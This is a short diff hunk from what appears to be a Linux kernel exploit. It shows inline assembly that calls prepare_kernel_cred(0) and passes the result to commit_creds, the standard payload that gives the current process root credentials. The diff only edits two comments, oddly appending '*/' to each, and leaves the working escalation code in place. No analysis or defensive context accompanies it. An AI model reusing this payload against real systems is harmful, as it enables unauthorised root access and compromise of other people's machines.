@@ -40,11 +40,11 @@ void __commit_prepare_cred(uintptr_t commit_creds_addr,
 {
     __asm__ __volatile__ (
         ".intel_syntax noprefix;"
-        // prepare_kernel_cred
+        // prepare_kernel_cred*/
         "mov rax, %[pkc];"
         "xor rdi, rdi;"
         "call rax;"
-        // commit_creds with prepared cred_struct
+        // commit_creds*/
         "mov rdi, rax;"
         "mov rax, %[cc];"
         "call rax;"
